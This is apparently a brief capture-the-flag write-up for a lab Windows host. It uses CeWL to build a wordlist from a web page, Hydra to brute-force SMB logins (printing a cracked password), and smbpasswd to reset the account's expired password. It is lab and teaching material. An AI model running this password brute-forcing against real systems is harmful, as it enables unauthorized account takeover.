## Brute Force
#### Cewl to get a pwd dictionary
It may take a minute or so
```
❯ cewl --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm -w cewl3.txt  
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```


#### Hydra
It may take two or three minutes
```
❯ cat users.txt  
pmerton  
tlavel   
❯ export IP=10.129.2.5           
❯ hydra -L users.txt -P cewl3.txt $IP smb
[445][smb] host: 10.129.2.5   login: tlavel   password: Fabricorp01
```
## SMB 
#### smbclient
```
❯ smbclient -L $IP -U tlavel  
Password for [WORKGROUP\tlavel]:  
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```
#### smbpasswd to update it
```
smbpasswd -r $IP -U tlavel
```